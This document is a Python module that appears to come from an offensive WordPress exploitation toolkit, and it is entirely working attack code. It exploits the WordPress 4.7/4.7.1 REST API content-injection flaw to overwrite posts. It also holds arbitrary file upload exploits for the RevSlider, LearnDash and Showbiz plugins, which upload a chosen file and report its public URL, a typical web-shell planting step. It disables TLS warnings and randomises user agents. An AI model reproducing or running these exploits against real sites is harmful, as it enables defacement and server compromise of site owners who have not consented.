#-*- coding: utf-8 -*-
import requests,re,sys,os,urllib3,json
from fake_useragent import UserAgent
from .color import R,G,B,Y,W

requests.packages.urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
uag = {'User-Agent':UserAgent().random}

class wp_content_inject:

      def get_version(self,target):
          ver = ""
          self.target = target
          resp = requests.get(f"{self.target}").text
          _ver = re.findall('ver=(.*)"',resp)
          if len(_ver) == 0:
             ver += "xxx"
          else:
             ver += _ver[0]
          return ver


      def get_id(self,target):
          self.target = target
          dat = requests.get(f"{self.target}/wp/v2/posts").json()
          return "Post ID : {}\nTitle : {}\nLink : {}".format(
                                                             dat['id'],
                                                             dat['title']['rendered'],
                                                             dat['link']
          )

      def get_wp_post(self,taregt):
          self.target = target
          resp = requests.get(self.target).text
          wp_post = re.findall("https://api.w.org/' href='(.*)'",resp)[0]
          return wp_post

      def wordpress_content_injection(self,target):
          self.target = target
          tes = self.get_version(self.target)
          print(tes)
          if tes == "4.7" or tes == "4.7.1":
             print("[!] Potential Vulnerability")
             self.get_id(self.target)
             print('select post ID\n')
             id = str(input('Post ID : '))
             print("select title !\n")
             title = input('Title : ')
             print("e.g : Tested By me")
             pld = input('Payload : ')
             data = {'id':id+" textappendshere", 'title':title, 'content':pld}
             hider = {'Content-Type': "application/json; charset=xxxe", 'Accept':"application/json"}
             res = requests.post(
                                 f"{self.target}wp/v2/posts/{id}/?id={id}CBF",
                                 data=json.dumps(data),
                                 headers=hider
             )
             print(res)
             print(f'{G}[*]{W} Success.....\n') 
          else:
             print(f"{R}[Ã—]{W} Not Vulnerability For wordpress version : {tes}") 

class wp_revslider:

      def wp_revslider_arbitary_file_upload(self,target,path,name):
          self.target = target
          self.path = path
          self.name = name
          requests.post(
                        f"{self.target}/wp-admin/admin-ajax.php",
                        data={'action':'revslider_ajax_action','client_action':'update_plugin'},
                        files={"update_file":(self.name,open(f'{self.path}','rb'))},
                        headers=uag
          )
          cek = requests.get(f"{self.target}/wp-content/plugins/revslider/temp/update_extract/{self.name}")
          if cek.status_code == 200:
              print(f'{G}[*]{W} Success : {self.target}/wp-content/plugins/revslider/temp/update_extract/{self.name}')
          else:
              print(f'{R}[-]{W} Not Vulnerability')

class wp_learndash:

      def wp_learndash_arbitary_file_upload(self,target,path,name):
          self.target = target
          self.path = path
          self.name = name
          requests.post(
                        f"{self.target}",
                        data={'post':'foobar','course_id':'foobar','uploadfile':'foobar'},
                        files={'uploadfiles[]':(self.name,open(f"{self.path}","rb"))}
          )
          cek = requests.get(f"{self.target}/wp-content/uploads/assignments/{self.name}")
          if cek == 200:
             print(f"{G}[*]{W} Success : {self.target}/wp-content/uploads/assignments/{self.name}")
          else:
             print('{R}[x]{W} Failed ! Not Vulnerability')

class wp_showbiz:

      def wp_showbiz_arbitary_file_upload(self,target,path,name):
         self.target = target
         self.path = path
         self.name = name
         requests.post(
                       f"{self.target}/wp-admin/admin-ajax.php",
                       data={'action':'showbiz_ajax_action','client_action':'update_plugin'},
                       files={'update_file':(self.name,open(f"{self.path}","rb"),"text/html")}
         )
         cek = requests.get(f"{self.target}/wp-content/plugins/showbiz/temp/update_extract/{self.name}").status_code
         if cek == 200:
            print(f"{G}[*]{W} Success : {self.target}/wp-content/plugins/showbiz/temp/update_extract/{self.name}")
         else:
            print(f'{R}[x]{W} Failed ! Not Vulnerability')



